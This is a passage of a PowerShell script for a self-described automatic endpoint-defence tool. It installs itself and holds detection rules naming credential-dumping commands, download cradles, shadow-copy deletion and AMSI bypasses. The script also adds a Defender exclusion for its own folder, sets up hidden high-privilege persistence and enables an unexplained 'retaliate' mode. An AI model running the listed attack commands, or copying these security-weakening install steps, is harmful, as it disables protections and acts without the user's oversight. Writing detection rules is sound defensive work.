#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Gorstak EDR - Unified Endpoint Defense Platform (Fully Automatic)
.DESCRIPTION
    Fully automatic EDR with no user interaction required.
    Self-installs to C:\ProgramData\Antivirus and runs under current admin user.
    All detection and response features enabled by default.
.NOTES
    Run as Administrator once - will automatically persist.
#>

# ═══════════════════════════════════════════════════════════════
# AUTO-START - Check if we need to install first
# ═══════════════════════════════════════════════════════════════
$Script:IntervalMinutes = 5
$Script:InstallDir = 'C:\ProgramData\Antivirus'
$Script:SelfPath = $PSCommandPath
$Script:InstalledMarker = Join-Path $Script:InstallDir 'installed.txt'

# Check if we're running from install location
$IsRunningFromInstall = $Script:SelfPath -eq (Join-Path $Script:InstallDir 'GorstaksEDR.ps1')

if (-not $IsRunningFromInstall -and -not (Test-Path $InstalledMarker)) {
    # First run - install and relaunch
    Write-Host "[GorstaksEDR] First run - installing to $Script:InstallDir..." -ForegroundColor Cyan
    
    # Create install directory
    if (-not (Test-Path $Script:InstallDir)) {
        New-Item -ItemType Directory -Path $Script:InstallDir -Force | Out-Null
    }
    
    # Copy self to install location
    $DestPath = Join-Path $Script:InstallDir 'GorstaksEDR.ps1'
    Copy-Item -Path $Script:SelfPath -Destination $DestPath -Force
    
    # Create marker file
    "Installed at $(Get-Date)" | Out-File $InstalledMarker -Encoding UTF8
    
    # Create subdirectories
    foreach ($sub in @('Logs', 'Quarantine', 'Alerts', 'vpn')) {
        $p = Join-Path $Script:InstallDir $sub
        if (-not (Test-Path $p)) { New-Item -ItemType Directory -Path $p -Force | Out-Null }
    }
    
    # Add Defender exclusion
    try {
        Add-MpPreference -ExclusionPath $Script:InstallDir -ErrorAction SilentlyContinue
    } catch { }
    
    # Get current user for scheduled task
    $CurrentUser = $null
    try { $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name } catch {}
    if (-not $CurrentUser) { $CurrentUser = "$env:USERDOMAIN\$env:USERNAME" }

    # Register persistence via ScheduledTask cmdlets; fall back to schtasks.exe
    $TaskName = 'GorstaksEDR'
    $TaskCmd  = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$DestPath`""

    # Clean up legacy persistence (startup shortcut, VBS wrapper, old task name)
    $LegacyShortcut = Join-Path ([Environment]::GetFolderPath('Startup')) 'GorstaksEDR.lnk'
    if (Test-Path $LegacyShortcut) { Remove-Item $LegacyShortcut -Force -EA SilentlyContinue }
    $LegacyVbs = Join-Path $Script:InstallDir 'launcher.vbs'
    if (Test-Path $LegacyVbs) { Remove-Item $LegacyVbs -Force -EA SilentlyContinue }
    foreach ($old in @('GorstaksEDR_User')) {
        Unregister-ScheduledTask -TaskName $old -Confirm:$false -EA SilentlyContinue
        schtasks.exe /Delete /TN $old /F 2>$null | Out-Null
    }

    # Attempt 1: PowerShell ScheduledTask cmdlets (preferred)
    $taskRegistered = $false
    try {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -EA SilentlyContinue
        $action    = New-ScheduledTaskAction -Execute 'powershell.exe' `
                        -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$DestPath`""
        $trigger   = New-ScheduledTaskTrigger -AtLogOn -User $CurrentUser
        $principal = New-ScheduledTaskPrincipal -UserId $CurrentUser -LogonType Interactive -RunLevel Highest
        $settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
                        -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Seconds 0)
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger `
            -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
        $taskRegistered = $true
        Write-Host "[GorstaksEDR] Scheduled task registered (PS cmdlets) for $CurrentUser" -ForegroundColor Green
    } catch {
        Write-Host "[GorstaksEDR] PS ScheduledTask failed: $_ — falling back to schtasks.exe" -ForegroundColor Yellow
    }

    # Attempt 2: schtasks.exe fallback
    if (-not $taskRegistered) {
        try {
            schtasks.exe /Delete /TN $TaskName /F 2>$null | Out-Null
            schtasks.exe /Create /TN $TaskName /TR $TaskCmd /SC ONLOGON /RL HIGHEST /F 2>$null | Out-Null
            if ($LASTEXITCODE -eq 0) {
                $taskRegistered = $true
                Write-Host "[GorstaksEDR] Scheduled task registered (schtasks.exe)" -ForegroundColor Green
            }
        } catch { }
    }

    if (-not $taskRegistered) {
        Write-Host "[GorstaksEDR] WARNING: Could not register persistence — EDR will not auto-start" -ForegroundColor Red
    }

    Write-Host "[GorstaksEDR] Installation complete! Starting EDR..." -ForegroundColor Green
    Start-Sleep -Seconds 2
    
    # Relaunch from install location
    & $DestPath
    exit
}

# ═══════════════════════════════════════════════════════════════
# If we get here, we're running from install location - start EDR
# ═══════════════════════════════════════════════════════════════

# Suppress all output except critical alerts
$WarningPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ═══════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════
function _NV { param($A,$B) if ($null -ne $A -and $A -ne '') { $A } else { $B } }

function New-GShieldRunspace {
    $iss = [InitialSessionState]::CreateDefault2()
    [runspacefactory]::CreateRunspace($iss)
}

# ═══════════════════════════════════════════════════════════════
# SECTION 1: CONFIGURATION (ALL OPTIONS ENABLED)
# ═══════════════════════════════════════════════════════════════
$Script:EDRConfig = @{
    InstallDir          = $Script:InstallDir
    LogPath             = "$Script:InstallDir\Logs"
    QuarantinePath      = "$Script:InstallDir\Quarantine"
    WhitelistPath       = "$Script:InstallDir\whitelist.json"
    HashDBPath          = "$Script:InstallDir\hashdb.json"
    WatchPaths          = @((Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null }).Root | ForEach-Object { $_.TrimEnd('\') })
    ExcludePaths        = @($Script:InstallDir)
    ScanIntervalSec     = 5
    MaxLogSizeMB        = 50
    EnableRealTime      = $true
    EnableNetwork       = $true
    EnableChainMonitor  = $true
    EnableMemoryScan    = $true
    EnableAMSI          = $true
    EnableRansomwareDetect = $true
    EnableKeyScrambler  = $true
    EnableRetaliate     = $true
    EnablePasswordRotator = $true
    SandboxTimeoutSec   = 30
    ChainTTLSeconds     = 300
    ChainDepthAlert     = 4
    RansomwareWindowSec = 30
    RansomwareRenameThreshold = 50
    SelfProcessId       = $PID
    SelfHash            = ''
}

# GShield config
$Script:PwRotatorDir = 'C:\ProgramData\PasswordRotator'
$Script:UACPolicyKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
$Script:UACConsentDesired = 5
$Script:BrowserNames = @('chrome','msedge','firefox','opera','brave','vivaldi','iexplore','waterfox',
    'palemoon','seamonkey','librewolf','tor','chromium','maxthon','yandex','avastbrowser')
$Script:NeverRetaliateIPs = @('8.8.8.8','8.8.4.4','1.1.1.1','1.0.0.1')
$Script:VpnGateApiUrl = 'https://www.vpngate.net/api/iphone/'
$Script:VpnGateConnName = 'GShield-VPNGate'
$Script:VpnGateWorkDir = "$Script:InstallDir\vpn"
$Script:VpnGateL2tpPsk = 'vpn'
$Script:VpnGateCredUser = 'vpn'
$Script:VpnGateCredPass = 'vpn'
$Script:VpnGateMaxCandidates = 40
$Script:VpnGateCheckSeconds = 45
$Script:VpnGateRefreshMinutes = 25
$Script:VpnGatePreferCountries = @()
$Script:NoVpnGate = $false

# Auto-response fully enabled
$Script:ResponseConfig = @{
    AutoKillThreshold=80
    AutoQuarantineThreshold=70
    AutoBlockThreshold=60
    AlertThreshold=40
    ProtectedProcesses=@('System','smss','csrss','wininit','winlogon','services','lsass','svchost','dwm',
        'explorer','taskhostw','sihost','fontdrvhost','RuntimeBroker','MsMpEng')
    AutoResponseEnabled=$true  # AUTOMATIC RESPONSE ENABLED
}

# ═══════════════════════════════════════════════════════════════
# SECTION 2: GLOBAL STATE
# ═══════════════════════════════════════════════════════════════
$Script:ProcessTracker    = @{}
$Script:AlertHistory      = [System.Collections.ArrayList]::new()
$Script:ActiveWatchers    = [System.Collections.ArrayList]::new()
$Script:BeaconTracker     = @{}
$Script:HashRepDB         = @{}
$Script:Whitelist         = @{ Paths = @(); Hashes = @() }
$Script:RansomRenames     = 0
$Script:RansomExtChanges  = @{}
$Script:RansomWindowStart = Get-Date
$Script:RetaliatedConns   = @{}
$Script:BrowserConns      = @{}
$Script:AllowedIPs        = @()

# ═══════════════════════════════════════════════════════════════
# SECTION 3: EMBEDDED RULES & DATA (SAME AS ORIGINAL)
# ═══════════════════════════════════════════════════════════════
$Script:CustomRules = @(
    @{ Name='CobaltStrike';  Desc='Cobalt Strike beacon';       Cat='C2';            Sev='Critical'; Score=90;  Patterns=@('beacon\.dll','cobaltstrike','sleeptime','%COMSPEC%','IEX.*downloadstring.*http'); Cond='any' }
    @{ Name='PowerSploit';   Desc='PowerSploit framework';      Cat='Execution';     Sev='High';     Score=75;  Patterns=@('invoke-shellcode','invoke-reflectivepeinjection','invoke-dllinjection','invoke-tokenmanipulation','get-gpppassword','invoke-kerberoast'); Cond='any' }
    @{ Name='SharpTools';    Desc='C# offensive tools';         Cat='Execution';     Sev='High';     Score=70;  Patterns=@('sharphound','rubeus','seatbelt','sharpup','certify','whisker'); Cond='any' }
    @{ Name='Mimikatz';      Desc='Credential dumping';         Cat='CredAccess';    Sev='Critical'; Score=95;  Patterns=@('mimikatz','sekurlsa','kerberos::','lsadump::','privilege::debug','token::elevate','dpapi::'); Cond='any' }
    @{ Name='DownloadCradle';Desc='Download cradles';           Cat='Delivery';      Sev='High';     Score=65;  Patterns=@('certutil.*-urlcache','bitsadmin.*\/transfer','Invoke-WebRequest.*http','Start-BitsTransfer','Net\.WebClient','DownloadFile\(','DownloadString\('); Cond='any' }
    @{ Name='ProcessInject';  Desc='Process injection';          Cat='DefEvasion';    Sev='Critical'; Score=85;  Patterns=@('VirtualAllocEx','WriteProcessMemory','CreateRemoteThread','NtMapViewOfSection','QueueUserAPC','RtlCreateUserThread'); Cond='any' }
    @{ Name='AMSIBypass';    Desc='AMSI bypass';                Cat='DefEvasion';    Sev='Critical'; Score=80;  Patterns=@('amsiInitFailed','AmsiScanBuffer','amsi\.dll','AmsiUtils','amsiContext'); Cond='any' }
    @{ Name='Persistence';   Desc='Persistence techniques';     Cat='Persistence';   Sev='High';     Score=60;  Patterns=@('schtasks.*\/create','New-ScheduledTask','HKCU:\\\\.*\\\\Run','HKLM:\\\\.*\\\\Run','New-Service','sc\.exe.*create'); Cond='any' }
    @{ Name='LateralMove';   Desc='Lateral movement';           Cat='LateralMove';   Sev='High';     Score=70;  Patterns=@('Enter-PSSession','Invoke-Command.*-Computer','New-PSSession','wmic.*\/node:','psexec','winrm'); Cond='any' }
    @{ Name='Exfiltration';  Desc='Data exfiltration';          Cat='Exfiltration';  Sev='High';     Score=60;  Patterns=@('Compress-Archive','tar.*-czf','7z.*a\s','ToBase64String','nslookup.*txt','dns.*tunnel'); Cond='any' }
)

$Script:SuspiciousChains = @(
    @{ Parent='winword.exe';    Child='cmd.exe';        Score=40; Desc='Office->cmd' }
    @{ Parent='winword.exe';    Child='powershell.exe'; Score=50; Desc='Office->PS' }
    @{ Parent='excel.exe';      Child='cmd.exe';        Score=40; Desc='Excel->cmd' }
    @{ Parent='excel.exe';      Child='powershell.exe'; Score=50; Desc='Excel->PS' }
    @{ Parent='outlook.exe';    Child='cmd.exe';        Score=45; Desc='Outlook->cmd' }
    @{ Parent='outlook.exe';    Child='powershell.exe'; Score=55; Desc='Outlook->PS' }
    @{ Parent='mshta.exe';      Child='powershell.exe'; Score=60; Desc='MSHTA->PS' }
    @{ Parent='wscript.exe';    Child='powershell.exe'; Score=50; Desc='WScript->PS' }
    @{ Parent='cscript.exe';    Child='powershell.exe'; Score=50; Desc='CScript->PS' }
    @{ Parent='cmd.exe';        Child='powershell.exe'; Score=25; Desc='CMD->PS' }
    @{ Parent='services.exe';   Child='cmd.exe';        Score=40; Desc='Services->CMD' }
    @{ Parent='wmiprvse.exe';   Child='powershell.exe'; Score=55; Desc='WMI->PS' }
    @{ Parent='wmiprvse.exe';   Child='cmd.exe';        Score=45; Desc='WMI->CMD' }
    @{ Parent='svchost.exe';    Child='cmd.exe';        Score=35; Desc='Svchost->CMD' }
    @{ Parent='rundll32.exe';   Child='cmd.exe';        Score=45; Desc='Rundll32->CMD' }
    @{ Parent='regsvr32.exe';   Child='cmd.exe';        Score=50; Desc='Regsvr32->CMD' }
    @{ Parent='w3wp.exe';       Child='cmd.exe';        Score=80; Desc='IIS->CMD (webshell?)' }
    @{ Parent='w3wp.exe';       Child='powershell.exe'; Score=90; Desc='IIS->PS (webshell?)' }
    @{ Parent='sqlservr.exe';   Child='cmd.exe';        Score=80; Desc='SQL->CMD' }
)

# Per-LOLBin suspicious argument patterns
$Script:LOLBinArgs = @{
    'powershell.exe' = @('-enc','-encodedcommand','-nop','-noprofile','-w hidden','-windowstyle hidden','-ep bypass','-executionpolicy bypass','iex','invoke-expression','downloadstring','downloadfile','frombase64string','invoke-webrequest')
    'cmd.exe'        = @('/c powershell','/c mshta','/c certutil','/c bitsadmin','/c wscript','/c cscript')
    'mshta.exe'      = @('javascript:','vbscript:','http://','https://')
    'rundll32.exe'   = @('javascript:','shell32.dll','url.dll','advpack.dll')
    'regsvr32.exe'   = @('/s','/u','/i:http','scrobj.dll')
    'certutil.exe'   = @('-urlcache','-decode','-encode','http://','https://','-split')
    'wmic.exe'       = @('process call create','os get','/node:','shadowcopy delete','/format:')
    'msiexec.exe'    = @('/q','http://','https://')
    'cscript.exe'    = @('//e:','//b','.vbs','.js')
    'wscript.exe'    = @('//e:','//b','.vbs','.js')
    'bitsadmin.exe'  = @('/transfer','/create','/addfile','http://')
    'schtasks.exe'   = @('/create','/change','/run','/tn')
    'sc.exe'         = @('create','config','start','binpath=')
    'reg.exe'        = @('add','delete','CurrentVersion\\Run')
    'net.exe'        = @('user /add','localgroup administrators','share','use \\\\')
    'nltest.exe'     = @('/dclist','/domain_trusts','/dsgetdc')
    'msbuild.exe'    = @('/noautoresponse','/target:','/property:')
    'installutil.exe'= @('/logfile=','/LogToConsole=','/u')
    'csc.exe'        = @('/unsafe','/target:library','InteropServices')
    'bash.exe'       = @('-c','curl','wget','python','nc ')
    'forfiles.exe'   = @('/p','/m','/c','cmd')
    'pcalua.exe'     = @('-a','-c','-d')
}

$Script:CmdPatterns = @(
    @{ Pat='-enc\s';                           Sc=30; Desc='Encoded command';              M='T1059.001' }
    @{ Pat='-encodedcommand\s';                Sc=30; Desc='Encoded command (full)';       M='T1059.001' }
    @{ Pat='-nop\s.*-w\s+hidden';              Sc=35; Desc='Hidden PowerShell';            M='T1059.001' }
    @{ Pat='-ep\s+bypass';                     Sc=25; Desc='Execution policy bypass';      M='T1059.001' }
    @{ Pat='invoke-expression';                Sc=20; Desc='IEX usage';                    M='T1059.001' }
    @{ Pat='iex\s*\(';                         Sc=25; Desc='IEX shorthand';                M='T1059.001' }
    @{ Pat='frombase64string';                 Sc=30; Desc='Base64 decode';                M='T1140' }
    @{ Pat='reflection\.assembly';             Sc=40; Desc='Reflective loading';           M='T1620' }
    @{ Pat='net\s+user\s+.*\/add';             Sc=35; Desc='User creation';                M='T1136.001' }
    @{ Pat='net\s+localgroup\s+admin';         Sc=40; Desc='Admin group mod';              M='T1136.001' }
    @{ Pat='reg\s+add.*\\run\s';               Sc=35; Desc='Run key persistence';          M='T1547.001' }
    @{ Pat='schtasks\s+/create';               Sc=30; Desc='Scheduled task';               M='T1053.005' }
    @{ Pat='wmic\s+.*process\s+call\s+create'; Sc=40; Desc='WMI process create';          M='T1047' }
    @{ Pat='vssadmin.*delete\s+shadows';       Sc=50; Desc='Shadow copy deletion';         M='T1490' }
    @{ Pat='bcdedit.*recoveryenabled.*no';     Sc=50; Desc='Recovery disabled';            M='T1490' }
    @{ Pat='wbadmin\s+delete';                 Sc=45; Desc='Backup deletion';              M='T1490' }
    @{ Pat='netsh\s+advfirewall.*off';         Sc=40; Desc='Firewall disabled';            M='T1562.004' }
    @{ Pat='Set-MpPreference.*-Disable';       Sc=45; Desc='Defender disabled';            M='T1562.001' }
    @{ Pat='Add-MpPreference.*-ExclusionPath'; Sc=40; Desc='Defender exclusion';           M='T1562.001' }
    @{ Pat='\|\s*iex';                         Sc=40; Desc='Pipeline to IEX';              M='T1059.001' }
    @{ Pat='downloadstring\s*\(.*http';        Sc=45; Desc='Download and execute';         M='T1059.001' }
    @{ Pat='add-type.*dllimport';              Sc=50; Desc='P/Invoke via Add-Type';        M='T1106' }
    @{ Pat='clear-eventlog|wevtutil\s+cl';     Sc=50; Desc='Event log clearing';           M='T1070.001' }
)

$Script:MitreDB = @{
    'T1059.001'=@{Name='PowerShell';Tactic='Execution'}
    'T1059.003'=@{Name='Windows Command Shell';Tactic='Execution'}
    'T1047'=@{Name='WMI';Tactic='Execution'}
    'T1106'=@{Name='Native API';Tactic='Execution'}
    'T1053.005'=@{Name='Scheduled Task';Tactic='Persistence'}
    'T1547.001'=@{Name='Registry Run Keys';Tactic='Persistence'}
    'T1136.001'=@{Name='Local Account';Tactic='Persistence'}
    'T1027'=@{Name='Obfuscated Files';Tactic='DefenseEvasion'}
    'T1140'=@{Name='Deobfuscate/Decode';Tactic='DefenseEvasion'}
    'T1218'=@{Name='System Binary Proxy Execution';Tactic='DefenseEvasion'}
    'T1562.001'=@{Name='Disable Security Tools';Tactic='DefenseEvasion'}
    'T1562.004'=@{Name='Disable Firewall';Tactic='DefenseEvasion'}
    'T1620'=@{Name='Reflective Code Loading';Tactic='DefenseEvasion'}
    'T1055'=@{Name='Process Injection';Tactic='DefenseEvasion'}
    'T1070.001'=@{Name='Clear Event Logs';Tactic='DefenseEvasion'}
    'T1490'=@{Name='Inhibit System Recovery';Tactic='Impact'}
    'T1033'=@{Name='System Owner Discovery';Tactic='Discovery'}
    'T1018'=@{Name='Remote System Discovery';Tactic='Discovery'}
}

$Script:ThreatIntel = @{
    SuspiciousPorts = @(4444,5555,6666,8888,9999,1337,31337,12345,4443,8443,6667,6697)
}

$Script:RansomwareExtensions = @('.encrypted','.locked','.crypt','.crypto','.enc','.locky','.cerber',
    '.zepto','.thor','.aesir','.zzzzz','.micro','.xxx','.ttt','.ecc','.ezz','.exx',
    '.abc','.aaa','.xtbl','.crysis','.crypz','.dharma','.wallet','.onion','.wncry',
    '.wcry','.wnry','.petya','.bad','.globe','.bleep','.crypted','.pay','.ransom','.rip')

$Script:RansomNotePatterns = @('readme','recover','restore','decrypt','how to',
    'help_decrypt','help_recover','ransom','payment','_readme','!readme')

# ═══════════════════════════════════════════════════════════════
# SECTION 4: LOGGING (Minimal - only critical)
# ═══════════════════════════════════════════════════════════════
function Write-EDRLog {
    param([string]$Message, [ValidateSet('INFO','WARN','ALERT','CRITICAL','DEBUG')][string]$Level = 'INFO')
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'
    $entry = "[$ts] [$Level] $Message"
    if (-not (Test-Path $Script:EDRConfig.LogPath)) { New-Item -ItemType Directory -Path $Script:EDRConfig.LogPath -Force | Out-Null }
    $logFile = Join-Path $Script:EDRConfig.LogPath "edr_$(Get-Date -Format 'yyyyMMdd').log"
    Add-Content -Path $logFile -Value $entry
    # Only show CRITICAL to console
    if ($Level -eq 'CRITICAL') {
        Write-Host $entry -ForegroundColor Red
    }
}

# ═══════════════════════════════════════════════════════════════
# SECTION 5: SELF-PROTECTION & INTEGRITY
# ═══════════════════════════════════════════════════════════════
function Test-IsExcludedPath {
    param([string]$Path)
    if (-not $Path) { return $false }
    $low = $Path.ToLower()
    foreach ($ex in $Script:EDRConfig.ExcludePaths) {
        if ($low.StartsWith($ex.ToLower())) { return $true }
    }
    return $false
}

function Test-IsSelfProcess {
    param([int]$ProcessId)
    return ($ProcessId -eq $Script:EDRConfig.SelfProcessId)
}

function Initialize-SelfIntegrity {
    try {
        $exePath = $PSCommandPath
        if ($exePath -and (Test-Path $exePath)) {
            $Script:EDRConfig.SelfHash = (Get-FileHash $exePath -Algorithm SHA256).Hash
            Write-EDRLog "Self-integrity hash updated" 'INFO'
        }
    } catch { }
}

function Test-SelfIntegrity {
    if (-not $Script:EDRConfig.SelfHash) { return $true }
    try {
        $exePath = $PSCommandPath
        if ($exePath -and (Test-Path $exePath)) {
            $current = (Get-FileHash $exePath -Algorithm SHA256).Hash
            if ($current -ne $Script:EDRConfig.SelfHash) {
                Write-EDRLog 'INTEGRITY VIOLATION: EDR script has been modified!' 'CRITICAL'
                return $false
            }
        }
    } catch { }
    return $true
}

# ═══════════════════════════════════════════════════════════════
# SECTION 6: WHITELIST & HASH REPUTATION
# ═══════════════════════════════════════════════════════════════
function Initialize-Whitelist {
    $wlPath = $Script:EDRConfig.WhitelistPath
    if (Test-Path $wlPath) {
        try {
            $wl = Get-Content $wlPath -Raw | ConvertFrom-Json
            $Script:Whitelist.Paths = @($wl.Paths)
            $Script:Whitelist.Hashes = @($wl.Hashes)
        } catch { }
    }
    if ($Script:Whitelist.Paths -notcontains $Script:EDRConfig.InstallDir) {
        $Script:Whitelist.Paths += $Script:EDRConfig.InstallDir
    }
}

function Test-IsWhitelisted {
    param([string]$FilePath, [string]$SHA256)
    if ($FilePath) {
        $low = $FilePath.ToLower()
        foreach ($wp in $Script:Whitelist.Paths) {
            if ($low.StartsWith($wp.ToLower())) { return $true }
        }
    }
    if ($SHA256 -and $Script:Whitelist.Hashes -contains $SHA256) { return $true }
    return $false
}

function Initialize-HashRepDB {
    $dbPath = $Script:EDRConfig.HashDBPath
    if (Test-Path $dbPath) {
        try {
            $db = Get-Content $dbPath -Raw | ConvertFrom-Json
            foreach ($entry in $db) {
                $Script:HashRepDB[$entry.Hash] = $entry.ThreatName
            }
        } catch { }
    }
    if ($Script:EDRConfig.SelfHash) {
        $Script:Whitelist.Hashes += $Script:EDRConfig.SelfHash
    }
}

function Get-HashReputation {
    param([string]$SHA256)
    $result = [PSCustomObject]@{ IsKnownMalicious = $false; ThreatName = ''; Score = 0 }
    if ($SHA256 -and $Script:HashRepDB.ContainsKey($SHA256)) {
        $result.IsKnownMalicious = $true
        $result.ThreatName = $Script:HashRepDB[$SHA256]
        $result.Score = 80
    }
    return $result
}

# ═══════════════════════════════════════════════════════════════
# SECTION 7: P/INVOKE TYPES (Memory Scanner)
# ═══════════════════════════════════════════════════════════════
$Script:PInvokeLoaded = $false
function Initialize-PInvoke {
    if ($Script:PInvokeLoaded) { return }
    try {
        if (-not ([System.Management.Automation.PSTypeName]'EDRNative').Type) {
            Add-Type -TypeDefinition @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class EDRNative {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(int access, bool inherit, int pid);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buf, int size, out int read);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern int VirtualQueryEx(IntPtr hProc, IntPtr addr, out MEMORY_BASIC_INFORMATION buf, int len);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress, AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State, Protect, Type;
    }

    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_QUERY_LIMITED = 0x1000;
    public const uint MEM_COMMIT = 0x1000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint PAGE_EXECUTE_WRITECOPY = 0x80;
    public const uint PAGE_EXECUTE = 0x10;
    public const uint PAGE_EXECUTE_READ = 0x20;
    public const uint MEM_PRIVATE = 0x20000;
    public const uint MEM_IMAGE = 0x1000000;

    public static bool ContainsBytes(byte[] haystack, int len, byte[] needle) {
        if (needle.Length > len) return false;
        int limit = len - needle.Length;
        for (int i = 0; i <= limit; i++) {
            bool match = true;
            for (int j = 0; j < needle.Length; j++) {
                if (haystack[i + j] != needle[j]) { match = false; break; }
            }
            if (match) return true;
        }
        return false;
    }
}
'@ -ErrorAction Stop
        }
        $Script:PInvokeLoaded = $true
    } catch { }
}

# ── AMSI Scanner ───────────────────────────────────────────────
$Script:AMSIAvailable = $false
$Script:AMSIContext = [IntPtr]::Zero

function Initialize-AMSI {
    if (-not $Script:EDRConfig.EnableAMSI) { return }
    try {
        if (-not ([System.Management.Automation.PSTypeName]'AMSINative').Type) {
            Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class AMSINative {
    [DllImport("amsi.dll", CharSet=CharSet.Unicode)]
    public static extern int AmsiInitialize(string appName, out IntPtr ctx);
    [DllImport("amsi.dll", CharSet=CharSet.Unicode)]
    public static extern int AmsiScanBuffer(IntPtr ctx, byte[] buf, uint len, string name, IntPtr session, out int result);
    [DllImport("amsi.dll")]
    public static extern void AmsiUninitialize(IntPtr ctx);
}
'@ -ErrorAction Stop
        }
        $ctx = [IntPtr]::Zero
        $hr = [AMSINative]::AmsiInitialize('GorstaksEDR', [ref]$ctx)
        if ($hr -eq 0 -and $ctx -ne [IntPtr]::Zero) {
            $Script:AMSIContext = $ctx
            $Script:AMSIAvailable = $true
        }
    } catch { }
}

function Invoke-AMSIScan {
    param([string]$Content, [string]$ContentName)
    if (-not $Script:AMSIAvailable -or -not $Content) { return 0 }
    try {
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($Content)
        $amsiResult = 0
        $hr = [AMSINative]::AmsiScanBuffer($Script:AMSIContext, $bytes, [uint32]$bytes.Length, $ContentName, [IntPtr]::Zero, [ref]$amsiResult)
        if ($hr -ne 0) { return 0 }
        if ($amsiResult -ge 32768) {
            Write-EDRLog "AMSI detected malware in: $ContentName" 'ALERT'
            return 80
        }
        if ($amsiResult -ge 16384) {
            return 50
        }
    } catch { }
    return 0
}

function Invoke-AMSIFileScan {
    param([string]$FilePath)
    if (-not $Script:AMSIAvailable) { return 0 }
    if (-not (Test-Path $FilePath)) { return 0 }
    $ext = [System.IO.Path]::GetExtension($FilePath).ToLower()
    if ($ext -notin @('.ps1','.vbs','.js','.wsf','.bat','.cmd','.hta')) { return 0 }
    try {
        $content = Get-Content $FilePath -Raw -ErrorAction SilentlyContinue
        if ($content.Length -gt 1048576) { $content = $content.Substring(0, 1048576) }
        return Invoke-AMSIScan -Content $content -ContentName ([System.IO.Path]::GetFileName($FilePath))
    } catch { return 0 }
}

# ═══════════════════════════════════════════════════════════════
# SECTION 8: STATIC ANALYSIS
# ═══════════════════════════════════════════════════════════════
function Invoke-StaticAnalysis {
    param([string]$FilePath)
    $r = [PSCustomObject]@{
        FilePath=$FilePath; FileSize=0; Hashes=@{}; IsSigned=$false; SignerName=''
        Entropy=0.0; IsPacked=$false; Score=0; Flags=[System.Collections.ArrayList]::new()
    }
    if (-not (Test-Path $FilePath)) { return $r }
    if (Test-IsExcludedPath $FilePath) { return $r }
    try {
        $r.FileSize = (Get-Item $FilePath).Length
        $r.Hashes = @{
            MD5=(Get-FileHash $FilePath -Algorithm MD5).Hash
            SHA1=(Get-FileHash $FilePath -Algorithm SHA1).Hash
            SHA256=(Get-FileHash $FilePath -Algorithm SHA256).Hash
        }
        if (Test-IsWhitelisted -FilePath $FilePath -SHA256 $r.Hashes.SHA256) { return $r }
        $rep = Get-HashReputation -SHA256 $r.Hashes.SHA256
        if ($rep.IsKnownMalicious) {
            $r.Score += $rep.Score
            $r.Flags.Add("Known malicious hash: $($rep.ThreatName)") | Out-Null
        }
        $sig = Get-AuthenticodeSignature $FilePath -ErrorAction SilentlyContinue
        if ($sig) { $r.IsSigned = ($sig.Status -eq 'Valid'); if ($sig.SignerCertificate) { $r.SignerName = $sig.SignerCertificate.Subject } }
        if (-not $r.IsSigned) { $r.Score += 10; $r.Flags.Add('Unsigned binary') | Out-Null }
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        if ($bytes.Length -gt 0) {
            $freq = @{}; foreach ($b in $bytes) { if ($freq.ContainsKey($b)) { $freq[$b]++ } else { $freq[$b]=1 } }
            $ent = 0.0; $len = $bytes.Length
            foreach ($c in $freq.Values) { $p = $c/$len; if ($p -gt 0) { $ent -= $p * [Math]::Log($p,2) } }
            $r.Entropy = [Math]::Round($ent,2)
            if ($ent -gt 7.2) { $r.IsPacked=$true; $r.Score+=25; $r.Flags.Add("High entropy ($($r.Entropy))") | Out-Null }
            elseif ($ent -gt 6.8) { $r.Score+=10; $r.Flags.Add("Elevated entropy ($($r.Entropy))") | Out-Null }
        }
        if ($bytes.Length -gt 64 -and $bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
            $ascii = [System.Text.Encoding]::ASCII.GetString($bytes)
            foreach ($sec in @('.upx','.aspack','.themida','.vmp','.enigma')) {
                if ($ascii -match [regex]::Escape($sec)) { $r.Score+=20; $r.Flags.Add("Packer section: $sec") | Out-Null }
            }
            foreach ($imp in @('VirtualAllocEx','WriteProcessMemory','CreateRemoteThread','NtUnmapViewOfSection','IsDebuggerPresent','GetAsyncKeyState')) {
                if ($ascii.Contains($imp)) { $r.Score+=15; $r.Flags.Add("Suspicious import: $imp") | Out-Null }
            }
            $wide = [System.Text.Encoding]::Unicode.GetString($bytes)
            foreach ($imp in @('VirtualAllocEx','WriteProcessMemory','CreateRemoteThread')) {
                if ($wide.Contains($imp) -and -not $ascii.Contains($imp)) { $r.Score+=10; $r.Flags.Add("Wide string import: $imp") | Out-Null }
            }
        }
